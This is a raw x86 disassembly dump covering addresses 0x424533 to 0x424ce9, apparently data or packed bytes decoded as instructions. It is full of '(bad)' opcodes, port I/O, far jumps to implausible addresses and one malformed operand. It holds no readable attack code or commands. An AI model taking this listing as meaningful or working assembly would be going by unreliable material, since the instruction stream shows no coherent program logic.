  424533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424534:	mov    bl,BYTE PTR ds:0x55374c2d
  42453a:	call   0xe8967d02
  42453f:	xchg   edx,eax
  424540:	gs inc ebx
  424542:	cmp    DWORD PTR [esi+esi*4],edx
  424545:	and    DWORD PTR [esi+0x0],edx
  42454b:	add    BYTE PTR [ecx-0x77],bl
  42454e:	add    al,0x29
  424550:	mov    WORD PTR [ebp-0x51c50a2e],fs
  424556:	aam    0xe5
  424558:	mov    ds:0x2baa99b2,al
  42455d:	rcr    BYTE PTR [ecx+0x4dc2680d],0x72
  424564:	out    0x87,al
  424566:	dec    ebx
  424567:	jb     0x4245c4
  424569:	jge    0x4244fc
  42456b:	sub    eax,0x7bfd1b8c
  424570:	sub    DWORD PTR ss:[ecx],esp
  424573:	add    BYTE PTR [ecx+0x325d48e5],bh
  424579:	out    0x47,al
  42457b:	ret    
  42457c:	push   ecx
  42457d:	mov    ecx,0x37e9000d
  424582:	pop    edx
  424583:	and    al,0xfd
  424585:	sbb    BYTE PTR ds:0x74b0f900,bl
  42458b:	add    BYTE PTR [esi+0x2d6c1ecb],al
  424591:	mov    cl,0xe9
  424593:	adc    eax,0x2d1df5
  424598:	or     dh,cl
  42459a:	stos   DWORD PTR es:[edi],eax
  42459b:	add    al,0xa9
  42459d:	jmp    0x1a6d3237
  4245a2:	out    0x83,al
  4245a4:	lds    ecx,FWORD PTR [eax-0x6972ab65]
  4245aa:	pop    ebp
  4245ab:	push   ebp
  4245ac:	pop    edi
  4245ad:	fst    QWORD PTR [ebp+0xf9]
  4245b3:	add    BYTE PTR [eax],al
  4245b5:	xor    dh,BYTE PTR [edx+ebx*1-0x18]
  4245b9:	sbb    DWORD PTR [esi+ecx*1],esi
  4245bc:	add    ch,ch
  4245be:	out    dx,eax
  4245bf:	sbb    BYTE PTR [edx+ebp*8-0xdfff150],al
  4245c6:	fdiv   st(6),st
  4245c8:	cmp    BYTE PTR [ebx],0x90
  4245cb:	cmp    eax,0x97b1e2f6
  4245d0:	inc    esp
  4245d1:	dec    ebp
  4245d2:	xchg   esp,eax
  4245d3:	xchg   ebp,eax
  4245d4:	inc    edx
  4245d5:	ins    DWORD PTR es:[edi],dx
  4245d6:	aaa    
  4245d7:	inc    edx
  4245d8:	and    al,0x4d
  4245da:	outs   dx,BYTE PTR ds:[esi]
  4245db:	cmp    eax,0x32dbb4ed
  4245e0:	sub    al,0xb2
  4245e2:	cmc    
  4245e3:	xchg   esi,eax
  4245e4:	ins    BYTE PTR es:[edi],dx
  4245e5:	dec    ebp
  4245e6:	cwde   
  4245e7:	xchg   edi,eax
  4245e8:	inc    esp
  4245e9:	popf   
  4245ea:	jle    0x4245e2
  4245ec:	adc    DWORD PTR ss:[eax-0x716faef2],esi
  4245f3:	push   ebp
  4245f4:	and    al,0x6c
  4245f6:	imul   edi,DWORD PTR [esi+0x44],0x8d2125b4
  4245fd:	push   esp
  4245fe:	lods   eax,DWORD PTR ds:[esi]
  4245ff:	inc    esi
  424600:	call   0x5600ad
  424605:	or     eax,0x1b1145da
  42460a:	xor    ax,0x1b20
  42460e:	loop   0x424609
  424610:	push   esp
  424611:	add    bh,BYTE PTR [esp+ecx*8-0x1712b377]
  424618:	out    0x0,al
  42461a:	add    BYTE PTR [eax],al
  42461c:	add    BYTE PTR [eax],al
  42461e:	xchg   esp,eax
  42461f:	mov    ds:0xa0a8247d,al
  424624:	push   esp
  424625:	adc    al,0x83
  424627:	ror    BYTE PTR [edx],cl
  424629:	jo     0x4245b7
  42462b:	add    al,0x66
  42462d:	rcl    DWORD PTR [eax],0x4e
  424630:	adc    BYTE PTR ss:[eax+0x8fe1119],0xce
  424638:	ss sbb al,0x1d
  42463b:	or     al,0x8e
  42463d:	leave  
  42463e:	xchg   esp,eax
  42463f:	mov    ds:0x81a4243e,al
  424644:	adc    dl,BYTE PTR [eax]
  424646:	nop
  424647:	sbb    DWORD PTR [esp+ecx*2-0x12054a54],ebx
  42464e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42464f:	sbb    DWORD PTR [ecx],edx
  424651:	xchg   dx,ax
  424653:	ror    DWORD PTR [edx-0x35e62f78],0x74
  42465a:	lods   al,BYTE PTR ds:[esi]
  42465b:	lods   eax,DWORD PTR ds:[esi]
  42465c:	xchg   edi,eax
  42465d:	fstp   QWORD PTR [ecx]
  42465f:	mov    ebp,0xb5192c36
  424664:	ss push esp
  424666:	or     DWORD PTR [ebp+0x25095836],ebp
  42466c:	xor    eax,0xc3b2195c
  424671:	daa    
  424672:	mov    al,0x1a
  424674:	jmp    0x42468a
  424676:	nop
  424677:	mov    dl,0x7a
  424679:	les    ebx,FWORD PTR [ebp-0x4bafb54c]
  42467f:	mov    bh,BYTE PTR [edi]
  424681:	lds    eax,FWORD PTR [eax]
  424683:	add    BYTE PTR [eax],al
  424685:	add    BYTE PTR [eax],al
  424687:	ret    
  424688:	mov    dl,0xf7
  42468a:	jmp    0x6e0f:0x3f7b1fc
  424691:	adc    eax,DWORD PTR [eax+0x19]
  424694:	outs   dx,BYTE PTR ds:[esi]
  424695:	(bad)  [ebx]
  424697:	outs   dx,BYTE PTR ds:[esi]
  424698:	lods   al,BYTE PTR ds:[esi]
  424699:	pop    esi
  42469a:	pop    eax
  42469b:	mov    ah,0x76
  42469d:	jo     0x4246f7
  42469f:	lods   al,BYTE PTR ds:[esi]
  4246a0:	xchg   BYTE PTR [edx+0x48],cl
  4246a3:	je     0x42462b
  4246a5:	bound  edi,QWORD PTR [eax]
  4246a7:	ins    BYTE PTR es:[edi],dx
  4246a8:	out    0xae,al
  4246aa:	mov    al,BYTE PTR [esi+ecx*8-0x4d]
  4246ae:	mov    cl,BYTE PTR [esi+ecx*8-0x7d]
  4246b2:	jmp    0x4246db
  4246b4:	cmp    esi,edi
  4246b6:	add    eax,DWORD PTR [ecx+0x35]
  4246b9:	xor    ebp,DWORD PTR [eax]
  4246bb:	js     0x42463f
  4246bd:	jb     0x424706
  4246bf:	ins    BYTE PTR es:[edi],dx
  4246c0:	jb     0x4246e9
  4246c2:	(bad)  
  4246c3:	(bad)  
  4246c5:	sub    ebp,esp
  4246c7:	cmc    
  4246c8:	shl    dh,cl
  4246ca:	add    edx,DWORD PTR ds:0xb92c2af3
  4246d0:	jle    0x4246e5
  4246d2:	clc    
  4246d3:	jmp    0xdd1f6dac
  4246d8:	(bad)  
  4246d9:	jg     0x346a1dab
  4246df:	out    dx,al
  4246e0:	mov    cl,0x4a
  4246e2:	inc    edi
  4246e3:	je     0x42474f
  4246e5:	pop    es
  4246e6:	in     al,dx
  4246e7:	jns    0x4246aa
  4246e9:	test   BYTE PTR [ebx],0x0
  4246ec:	add    BYTE PTR [eax],al
  4246ee:	add    BYTE PTR [eax],al
  4246f0:	adc    al,0xf3
  4246f2:	or     eax,0xe3b0fe6
  4246f7:	jmp    0xda4808f
  4246fc:	rcr    BYTE PTR [eax-0x299893ee],0x2a
  424703:	mov    al,0x2b
  424705:	into   
  424706:	test   ecx,ebp
  424708:	xchg   ebx,eax
  424709:	sbb    DWORD PTR [ebx+0x3ebaafad],0x6c
  424710:	push   edi
  424711:	(bad)  
  424712:	dec    esi
  424713:	cdq    
  424714:	push   es
  424715:	outs   dx,DWORD PTR ds:[esi]
  424716:	xor    dh,BYTE PTR [ebp-0x17d12c05]
  42471c:	xchg   ebx,eax
  42471d:	aaa    
  42471e:	into   
  42471f:	xchg   ebp,eax
  424720:	mov    bh,0xdb
  424722:	dec    edx
  424723:	int    0xdf
  424725:	fwait
  424726:	or     al,0xb8
  424728:	in     al,dx
  424729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42472a:	xor    ah,cl
  42472c:	push   ss
  42472d:	outs   dx,DWORD PTR ds:[esi]
  42472e:	xor    bl,BYTE PTR [ecx+0x641a9883]
  424734:	dec    edi
  424735:	(bad)  
  424736:	push   esi
  424737:	cdq    
  424738:	mov    ebx,0x93e80bff
  42473d:	ss into 
  42473f:	push   ebp
  424740:	cmp    DWORD PTR fs:[edx+0xd],esp
  424744:	dec    eax
  424745:	and    al,0x52
  424747:	add    eax,0xed62b3dc
  42474c:	push   ss
  42474d:	cld    
  42474e:	clc    
  42474f:	loop   0x424759
  424751:	jbe    0x424785
  424753:	inc    ecx
  424754:	add    BYTE PTR [eax],al
  424756:	add    BYTE PTR [eax],al
  424758:	add    BYTE PTR [edi+eax*4+0x6e191443],bh
  42475f:	xor    al,BYTE PTR [ecx+0x74]
  424762:	out    dx,eax
  424763:	or     al,ch
  424765:	xchg   ebx,eax
  424766:	ss into 
  424768:	sbb    eax,0xc54a39a8
  42476d:	fbld   TBYTE PTR [ecx]
  42476f:	retf   
  424770:	add    BYTE PTR [edx+esi*2-0x1c6697ce],bh
  424777:	inc    ebx
  424778:	push   0x26
  42477a:	sub    bl,BYTE PTR [edx+0x24]
  42477d:	or     DWORD PTR [esi],0xb5381b9f
  424783:	xchg   edx,eax
  424784:	rol    BYTE PTR [ecx+eiz*1-0x6c],0xdd
  424789:	shr    BYTE PTR [edx+0x1192ee95],cl
  42478f:	in     eax,dx
  424790:	imul   edx,DWORD PTR [ebp-0x6a93687a],0xffffffd6
  424797:	xchg   ebp,eax
  424798:	outs   dx,DWORD PTR ds:[esi]
  424799:	fld    st(7)
  42479b:	loopne 0x42479c
  42479d:	addr16 push cs
  42479f:	cdq    
  4247a0:	inc    eax
  4247a1:	stc    
  4247a2:	aaa    
  4247a3:	jb     0x4247c9
  4247a5:	mov    ebp,0xc5b4e9b4
  4247aa:	sub    al,0xe
  4247ac:	add    BYTE PTR [ecx-0xadb8dc9],bh
  4247b2:	mov    ah,0xe9
  4247b4:	mov    ah,0xd5
  4247b6:	xor    al,0xe
  4247b8:	add    BYTE PTR [ecx+0x247237],ch
  4247be:	add    BYTE PTR [eax],al
  4247c0:	add    BYTE PTR [eax],al
  4247c2:	or     eax,0x9574e9b5
  4247c7:	rcr    BYTE PTR [ebx-0x9916ab4],cl
  4247cd:	inc    edx
  4247ce:	outs   dx,BYTE PTR ds:[esi]
  4247cf:	mov    bh,0xe
  4247d1:	test   BYTE PTR [ecx],bh
  4247d3:	jo     0x424800
  4247d5:	or     esp,0xffffff82
  4247d8:	push   cs
  4247d9:	jbe    0x42484f
  4247db:	xor    DWORD PTR [ebx+0x70],eax
  4247de:	push   edx
  4247df:	mov    dh,0x3d
  4247e1:	sar    BYTE PTR [esi],cl
  4247e3:	jo     0x424817
  4247e5:	sbb    al,0xe2
  4247e7:	je     0x4247eb
  4247e9:	inc    DWORD PTR [edx+eax*4+0x11904895]
  4247f0:	and    eax,DWORD PTR [edi+0x2f34f5e4]
  4247f6:	push   eax
  4247f7:	mov    esp,0xd08fce8f
  4247fc:	aad    0x50
  4247fe:	loope  0x4247a8
  424800:	popf   
  424801:	and    al,0x4
  424803:	or     dl,BYTE PTR [ecx]
  424805:	add    BYTE PTR ds:0x28540d66,dl
  42480b:	jae    0x424865
  42480d:	add    DWORD PTR [eax-0x558a2e73],edx
  424813:	jle    0x42486a
  424815:	and    al,0xc8
  424817:	adc    DWORD PTR [eax-0x6bf66eb5],0xc78c8cc2
  424821:	or     BYTE PTR [edi+0xfb4b8b],bl
  424827:	add    BYTE PTR [eax],al
  424829:	add    BYTE PTR [eax],al
  42482b:	out    0xd8,eax
  42482d:	cli    
  42482e:	adc    eax,0x87110991
  424833:	fs in  eax,dx
  424835:	push   eax
  424836:	das    
  424837:	jmp    0x424895
  424839:	xchg   esi,eax
  42483a:	inc    esp
  42483b:	ins    BYTE PTR es:[edi],dx
  42483c:	jmp    0xf596d561
  424841:	cmp    BYTE PTR [eax+0x28],dl
  424844:	cld    
  424845:	adc    BYTE PTR [eax],al
  424847:	jo     0x42488f
  424849:	call   0x7444:0xcfbd6c5c
  424850:	mov    ecx,0x990000e
  424855:	(bad)  
  424856:	adc    eax,0x512650
  42485b:	adc    esi,ecx
  42485d:	adc    BYTE PTR [ebp-0x72],dh
  424860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424861:	push   esi
  424862:	and    al,0xb0
  424864:	xchg   esi,eax
  424865:	push   ecx
  424866:	pushf  
  424867:	lods   eax,DWORD PTR ds:[esi]
  424868:	xchg   BYTE PTR [ecx],dl
  42486a:	add    BYTE PTR [eax+0x17060db2],dl
  424870:	jmp    0x4248e7
  424872:	fisttp DWORD PTR [eax-0x4e]
  424875:	test   DWORD PTR [ebx],0x4b9359b
  42487b:	nop
  42487c:	mov    dl,0x1
  42487e:	push   cs
  42487f:	or     eax,0xd92bd386
  424884:	or     dh,BYTE PTR [esi+0x4ab2906f]
  42488a:	inc    eax
  42488b:	ins    BYTE PTR es:[edi],dx
  42488c:	shl    BYTE PTR [edi+0x86],cl
  424892:	add    BYTE PTR [eax],al
  424894:	aam    0xd6
  424896:	pop    ss
  424897:	xor    al,0x5
  424899:	xchg   BYTE PTR [ebx],bl
  42489b:	sub    BYTE PTR [edi],dl
  42489d:	in     eax,dx
  42489e:	ins    DWORD PTR es:[edi],dx
  42489f:	cmp    BYTE PTR [edx+ecx*8-0x4e9bd4c1],ch
  4248a6:	test   DWORD PTR [eax+eax*1+0x7f502d35],0x841f832b
  4248b1:	and    DWORD PTR [esi-0x1429ab7a],0xef00f33
  4248bb:	in     al,0x21
  4248bd:	and    BYTE PTR [ecx*4-0x13d0d526],bl
  4248c4:	ins    DWORD PTR es:[edi],dx
  4248c5:	mov    edi,?
  4248c7:	add    esi,DWORD PTR [edi]
  4248c9:	sbb    esp,esp
  4248cb:	dec    edi
  4248cc:	(bad)
  4248d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248d2:	sbb    cl,BYTE PTR [ebp-0x7b1c29ac]
  4248d8:	push   esp
  4248d9:	(bad)  
  4248da:	test   DWORD PTR [edi-0x5e],0x8b94031d
  4248e1:	enter  0xf643,0xbf
  4248e5:	mov    dl,0x60
  4248e7:	das    
  4248e8:	lods   al,BYTE PTR ds:[esi]
  4248e9:	(bad)  
  4248ea:	push   cs
  4248eb:	sbb    DWORD PTR ds:0xc1a0c7,ebx
  4248f1:	ins    BYTE PTR es:[edi],dx
  4248f2:	push   cs
  4248f3:	jmp    0x1c242ec9
  4248f8:	add    BYTE PTR [eax],al
  4248fa:	add    BYTE PTR [eax],al
  4248fc:	add    BYTE PTR ds:0x3fcd5a36,dl
  424902:	xor    eax,0x949181c1
  424907:	push   cs
  424908:	jmp    0xc974c023
  42490d:	sub    DWORD PTR [edi],0x52
  424910:	int    0x73
  424912:	sbb    BYTE PTR [ebx-0x66318feb],0x34
  424919:	sub    ebx,DWORD PTR [ebx+0x41]
  42491c:	call   0x6d207eb4
  424921:	loope  0x4248ca
  424923:	popf   
  424924:	sbb    al,BYTE PTR [ebp+0x21]
  424927:	adc    eax,0x9bc24fe8
  42492c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42492d:	xchg   edi,eax
  42492e:	fidivr DWORD PTR [esi]
  424930:	(bad)  
  424931:	fmul   DWORD PTR [edx]
  424933:	push   esi
  424934:	jmp    0x29d4fbcc
  424939:	dec    edi
  42493a:	test   eax,0x2b8b8e97
  42493f:	dec    edx
  424940:	int    0xab
  424942:	sub    ecx,DWORD PTR [edx-0x3b]
  424945:	lahf   
  424946:	sub    ecx,DWORD PTR [edx-0x33]
  424949:	push   ebx
  42494a:	das    
  42494b:	pop    edx
  42494c:	lds    ebx,FWORD PTR [ebx-0x6d5890f6]
  424952:	mov    dl,0x99
  424954:	popf   
  424955:	xchg   DWORD PTR [edx-0x4dd2790a],edi
  42495b:	push   cs
  42495c:	jb     0x4249a6
  42495e:	(bad)  
  42495f:	rol    WORD PTR [eax],0x0
  424963:	add    BYTE PTR [eax],al
  424965:	add    dh,bh
  424967:	mov    ecx,DWORD PTR [esi]
  424969:	jmp    0x74b788
  42496e:	aad    0xe
  424970:	fwait
  424971:	imul   ebp,DWORD PTR [ecx-0x4f],0xde9d4c95
  424978:	test   BYTE PTR [eax+edx*8-0x28a0f14a],0xdb
  424980:	inc    ebp
  424981:	mov    ecx,DWORD PTR [ebx+ebx*8]
  424984:	lods   eax,DWORD PTR ds:[esi]
  424985:	push   ebp
  424986:	mov    dl,0xa
  424988:	ins    DWORD PTR es:[edi],dx
  424989:	in     al,dx
  42498a:	jge    0x4249b7
  42498c:	push   ebx
  42498d:	hlt    
  42498e:	lahf   
  42498f:	int    0x3d
  424991:	call   FWORD PTR [esi-0x4d0e6a33]
  424997:	imul   edx,DWORD PTR [esi],0x50
  42499a:	adc    DWORD PTR [ebx*2-0x3162d6ff],ebx
  4249a1:	shrd   DWORD PTR [edi+0xe],eax,cl
  4249a5:	add    cl,bh
  4249a7:	daa    
  4249a8:	push   ebx
  4249a9:	hlt    
  4249aa:	jo     0x424988
  4249ac:	mov    ebp,DWORD PTR ss:[ecx+edi*8]
  4249b0:	mov    DWORD PTR ds:[edi],ebp
  4249b3:	aad    0x97
  4249b5:	inc    esi
  4249b6:	jmp    0xa3a9ce4
  4249bb:	out    0x95,al
  4249bd:	dec    ebp
  4249be:	loope  0x4249ed
  4249c0:	imul   edi,eax,0xffffff81
  4249c3:	push   esi
  4249c4:	pop    esp
  4249c5:	add    DWORD PTR [ecx+0x85be27],edi
  4249cb:	add    BYTE PTR [eax],al
  4249cd:	add    BYTE PTR [eax],al
  4249cf:	mov    esi,DWORD PTR [ebp-0x4f56786e]
  4249d5:	push   cs
  4249d6:	mov    ebp,esp
  4249d8:	clc    
  4249d9:	call   0xc888:0xed8ac14e
  4249e0:	sub    eax,0x7620044f
  4249e5:	push   ss
  4249e6:	mov    DWORD PTR [esi+eax*1-0x69],ebx
  4249ea:	dec    ebp
  4249eb:	nop
  4249ec:	add    DWORD PTR [esi-0x641c9bab],edx
  4249f2:	jge    0x424a60
  4249f4:	mov    ds:0x7768f44e,eax
  4249f9:	pop    esi
  4249fa:	add    BYTE PTR [eax-0x42731291],dl
  424a00:	push   ecx
  424a01:	sub    ch,al
  424a03:	mov    edx,0xbf00119d
  424a08:	mov    cs,WORD PTR [esi-0x24]
  424a0b:	loopne 0x4249a3
  424a0d:	push   esi
  424a0e:	in     al,dx
  424a0f:	cmp    BYTE PTR [edi-0x726fff1b],bl
  424a15:	shl    DWORD PTR [ebp+0x27],1
  424a18:	lds    edx,FWORD PTR [edi-0x6845a7bb]
  424a1e:	dec    ebp
  424a1f:	xor    al,0x32
  424a21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a22:	sbb    al,0x91
  424a24:	or     DWORD PTR [ebp-0x40],ebp
  424a27:	popf   
  424a28:	ins    BYTE PTR es:[edi],dx
  424a29:	ja     0x424a31
  424a2b:	jp     0x424a4b
  424a2d:	xchg   esi,eax
  424a2e:	inc    ebp
  424a2f:	inc    eax
  424a30:	pop    edx
  424a31:	cmp    al,0xfb
  424a33:	add    BYTE PTR [eax],al
  424a35:	add    BYTE PTR [eax],al
  424a37:	add    BYTE PTR [esi+0x1a4fac5],al
  424a3d:	or     edx,DWORD PTR [ecx]
  424a3f:	jg     0x424a15
  424a41:	std    
  424a42:	(bad)  
  424a43:	rcr    BYTE PTR [ebp-0x12],0x21
  424a47:	data16 fbld TBYTE PTR [esi+0x3f40b04e]
  424a4e:	adc    ecx,DWORD PTR [ebp-0x72de1aab]
  424a54:	push   ebp
  424a55:	sbb    eax,0xa9bedf8
  424a5a:	adc    DWORD PTR [eax+edx*8-0x6e50125b],eax
  424a61:	mov    al,0xf
  424a63:	shr    BYTE PTR cs:[ebx+eiz*1],1
  424a67:	leave  
  424a68:	shl    BYTE PTR [edx-0x7ab8fc05],cl
  424a6e:	and    eax,0x8daf62d
  424a73:	out    0xdd,eax
  424a75:	sbb    eax,DWORD PTR [edx]
  424a77:	sub    al,0xff
  424a79:	jbe    0x424a72
  424a7b:	mov    BYTE PTR [esi+0x27],bh
  424a7e:	scas   al,BYTE PTR es:[edi]
  424a7f:	aad    0x85
  424a81:	call   0x7fa7:0x279043c9
  424a88:	bound  esp,QWORD PTR [esi-0x3d6f6939]
  424a8e:	test   DWORD PTR [ebx],0xfc352de5
  424a94:	das    
  424a95:	adc    cl,cl
  424a97:	add    edx,DWORD PTR [eax+0x2c252d]
  424a9d:	add    BYTE PTR [eax],al
  424a9f:	add    BYTE PTR [eax],al
  424aa1:	fisttp QWORD PTR [edx]
  424aa3:	test   BYTE PTR [edx],dl
  424aa5:	nop
  424aa6:	mov    dl,0x70
  424aa8:	inc    eax
  424aa9:	ins    BYTE PTR es:[edi],dx
  424aaa:	mov    edx,0xb409e6a8
  424aaf:	pop    esi
  424ab0:	data16 mov WORD PTR [ecx],gs
  424ab3:	fisttp QWORD PTR [ebx]
  424ab5:	sbb    DWORD PTR [ebx+esi*8+0x6ec26a8a],ecx
  424abc:	push   esi
  424abd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424abe:	pop    es
  424abf:	stc    
  424ac0:	mov    ch,bh
  424ac2:	xor    al,0x25
  424ac4:	push   eax
  424ac5:	mov    ds:0x7c1f8b27,al
  424aca:	daa    
  424acb:	mov    WORD PTR [ebx],cs
  424acd:	call   0xdc177cb2
  424ad2:	sub    BYTE PTR [ebp-0x750deaf9],dh
  424ad8:	clc    
  424ad9:	pop    esp
  424ada:	test   DWORD PTR [ebp-0x4647bf95],esp
  424ae0:	add    ebx,DWORD PTR [ebp-0x7b]
  424ae3:	in     al,dx
  424ae4:	out    dx,al
  424ae5:	lahf   
  424ae6:	ror    DWORD PTR [esi],0xa9
  424ae9:	xchg   ebx,eax
  424aea:	sub    DWORD PTR [ebp+eiz*8+0x1e],edx
  424aee:	repnz popa 
  424af0:	in     eax,dx
  424af1:	or     al,dh
  424af3:	clc    
  424af4:	repz ret 0xdc31
  424af8:	ror    DWORD PTR [esi],0x50
  424afb:	in     al,dx
  424afc:	into   
  424afd:	mov    al,ds:0xbf274cf2
  424b02:	adc    eax,0xf1
  424b08:	add    BYTE PTR [eax],al
  424b0a:	xchg   ebx,eax
  424b0b:	test   BYTE PTR [esi-0x39],dh
  424b0e:	xchg   edx,eax
  424b0f:	mov    dl,0xe
  424b11:	bound  eax,QWORD PTR [edx-0x75]
  424b14:	ret    0xd019
  424b17:	mov    dl,0x44
  424b19:	sahf   
  424b1a:	ds jle 0x424b21
  424b1d:	sub    DWORD PTR [ecx+ebx*4-0x12f7222e],ecx
  424b24:	cmc    
  424b25:	sbb    al,0x91
  424b27:	mov    dl,0xe
  424b29:	jb     0x424b18
  424b2b:	jl     0x424afe
  424b2d:	push   0x2f
  424b2f:	retf   
  424b30:	inc    ebx
  424b31:	pop    ss
  424b32:	ins    DWORD PTR es:[edi],dx
  424b33:	pop    esp
  424b34:	cld    
  424b35:	call   0x7286fdcd
  424b3a:	jmp    0x6ebf:0xdcbe0e90
  424b41:	not    DWORD PTR [ebx-0x4e]
  424b44:	xchg   ecx,eax
  424b45:	sub    eax,0xe55d278f
  424b4a:	sbb    ah,dh
  424b4c:	neg    BYTE PTR [edi]
  424b4e:	shl    BYTE PTR [edx-0x31609df2],1
  424b54:	es je  0x424b63
  424b57:	xor    ecx,DWORD PTR [esi]
  424b59:	jmp    0x959776f1
  424b5e:	mov    ebx,0x93e87a41
  424b63:	cmp    DWORD PTR [eax+0x0],0xffffffa9
  424b67:	mov    esi,DWORD PTR [esi]
  424b69:	pop    edx
  424b6a:	cmp    al,0x71
  424b6c:	xor    dl,BYTE PTR [eax+eax*1]
  424b6f:	add    BYTE PTR [eax],al
  424b71:	add    BYTE PTR [eax],al
  424b73:	xchg   ecx,eax
  424b74:	fdivr  DWORD PTR [ebx]
  424b76:	add    BYTE PTR [ecx-0x566f6ed0],ch
  424b7c:	mov    ch,0xe
  424b7e:	push   eax
  424b7f:	jecxz  0x424b37
  424b81:	inc    esp
  424b82:	lea    ebp,[ebp-0x3c180136]
  424b88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b89:	push   cs
  424b8a:	add    BYTE PTR [edx+0x56],bh
  424b8d:	stos   DWORD PTR es:[edi],eax
  424b8e:	jmp    FWORD PTR [esi]
  424b90:	scas   al,BYTE PTR es:[edi]
  424b91:	push   cs
  424b92:	mov    eax,DWORD PTR [edi+ebp*2]
  424b95:	idiv   ch
  424b97:	pop    ebp
  424b98:	mov    ch,0xe
  424b9a:	movzx  edi,dh
  424b9d:	cmp    al,0xc9
  424b9f:	ret    0x4f5b
  424ba2:	rcl    DWORD PTR [edi],0x1e
  424ba5:	cmc    
  424ba6:	in     eax,dx
  424ba7:	std    
  424ba8:	mov    ah,0xe
  424baa:	pcmpeqd mm5,mm6
  424bad:	cmp    al,0xc9
  424baf:	and    ch,bl
  424bb1:	xchg   esp,eax
  424bb2:	aad    0x78
  424bb4:	xchg   edi,eax
  424bb5:	xchg   ecx,eax
  424bb6:	out    0x28,al
  424bb8:	mov    ch,0xe
  424bba:	call   0x511e90
  424bbf:	(bad)  
  424bc0:	cmp    ebx,esi
  424bc2:	xor    esi,DWORD PTR [eax-0x57be3c67]
  424bc8:	or     al,0xfe
  424bca:	out    0xc1,eax
  424bcc:	ror    BYTE PTR [esi],cl
  424bce:	add    dh,bh
  424bd0:	cmp    ecx,esi
  424bd2:	or     esi,DWORD PTR [edi+0xea9197]
  424bd8:	add    BYTE PTR [eax],al
  424bda:	add    BYTE PTR [eax],al
  424bdc:	call   0xa6cd5a95
  424be1:	in     eax,0x48
  424be3:	pop    ebp
  424be4:	cmp    ch,dl
  424be6:	xor    eax,0x110790c2
  424beb:	dec    edi
  424bec:	pushaw 
  424bee:	jg     0x424bda
  424bf0:	xchg   ecx,eax
  424bf1:	or     edx,DWORD PTR [ecx]
  424bf3:	push   edx
  424bf4:	sbb    edx,edx
  424bf6:	dec    esp
  424bf7:	add    BYTE PTR [ebx+0x20],al
  424bfa:	out    0x5f,al
  424bfc:	xchg   BYTE PTR [ebx+0x11],cl
  424bff:	xchg   DWORD PTR [edi+eiz*4],edx
  424c02:	fisub  WORD PTR [ebp-0x34]
  424c05:	jae    0x424c2b
  424c07:	(bad)  
  424c08:	iret   
  424c09:	int    0x22
  424c0b:	(bad)  
  424c0c:	retf   
  424c0d:	or     eax,0x8a682f6a
  424c12:	loop   0x424c14
  424c14:	nop
  424c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c16:	cwde   
  424c17:	les    edx,FWORD PTR [eax-0x5a78eef7]
  424c1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c1e:	call   0x54e4dc62
  424c23:	jl     0x424bdf
  424c25:	sbb    DWORD PTR [esi+0x110a5883],ecx
  424c2b:	add    al,ah
  424c2d:	jbe    0x424bc3
  424c2f:	adc    BYTE PTR [eax+0x2f501109],0x40
  424c36:	dec    ecx
  424c37:	(bad)  
  424c38:	nop
  424c39:	or     DWORD PTR [ecx],edx
  424c3b:	lea    edx,[edi]
  424c3d:	inc    edx
  424c3e:	adc    DWORD PTR [eax],eax
  424c40:	add    BYTE PTR [eax],al
  424c42:	add    BYTE PTR [eax],al
  424c44:	add    BYTE PTR [eax+0x207f8e59],dl
  424c4a:	or     dl,BYTE PTR [ecx]
  424c4c:	add    BYTE PTR [eax-0x80],ah
  424c4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c50:	jg     0x424c26
  424c52:	and    eax,eax
  424c54:	mov    bl,0xe4
  424c56:	or     al,0x11
  424c58:	add    BYTE PTR ds:0xe7fff591,bl
  424c5e:	or     DWORD PTR [ecx],esp
  424c60:	lea    edx,[edi]
  424c62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c63:	adc    al,BYTE PTR [eax]
  424c65:	nop
  424c66:	mov    dl,0xa7
  424c68:	jle    0x424c41
  424c6a:	or     dl,BYTE PTR [ebp+0x4b29005]
  424c70:	call   0x3005:0x3f7b088
  424c77:	test   DWORD PTR [ecx],0x8087b290
  424c7d:	adc    ebx,DWORD PTR [ebx]
  424c7f:	clc    
  424c80:	add    edx,DWORD PTR [eax-0x57418f7e]
  424c86:	pop    ebp
  424c87:	stc    
  424c88:	add    edx,DWORD PTR [eax-0x6e078bdb]
  424c8e:	mov    dl,0xf7
  424c90:	xor    edx,DWORD PTR [edi]
  424c92:	jmp    0x424c62
  424c94:	repz jbe 0x424cae
  424c97:	not    DWORD PTR [ecx+ebx*2]
  424c9a:	pop    esp
  424c9b:	lods   al,BYTE PTR ds:[esi]
  424c9c:	rcl    DWORD PTR [eax+0x5adc36b2],1
  424ca2:	retf   
  424ca3:	test   DWORD PTR [ebx],0x15875f8b
  424ca9:	add    BYTE PTR [eax],al
  424cab:	add    BYTE PTR [eax],al
  424cad:	add    BYTE PTR [ecx+0x5c],bl
  424cb0:	mov    ecx,ss
  424cb2:	nop
  424cb3:	mov    dl,0x36
  424cb5:	ret    
  424cb6:	xor    al,dl
  424cb8:	(bad)  
  424cb9:	(bad)  [edi-0x4e]
  424cbc:	test   DWORD PTR [eax],0xc9dff1e3
  424cc2:	sbb    DWORD PTR [ebx],esi
  424cc4:	popf   
  424cc5:	add    edx,DWORD PTR [eax+0x748970b2]
  424ccb:	stos   BYTE PTR es:[edi],al
  424ccc:	test   DWORD PTR [ebx],0xde78296b
  424cd2:	xchg   ecx,eax
  424cd3:	mov    dl,0xf7
  424cd5:	xor    DWORD PTR [edi],edx
  424cd7:	repz lahf 
  424cd9:	lds    ecx,FWORD PTR [edx+esi*4+0x7f423688]
  424ce0:	pusha  
  424ce1:	push   eax
  424ce2:	lods   al,BYTE PTR ds:[esi]
  424ce3:	mov    esi,0xa5f06a0e
  424ce8:	cdq    
  424ce9:	cmp    BYTE PTR [esi],dh
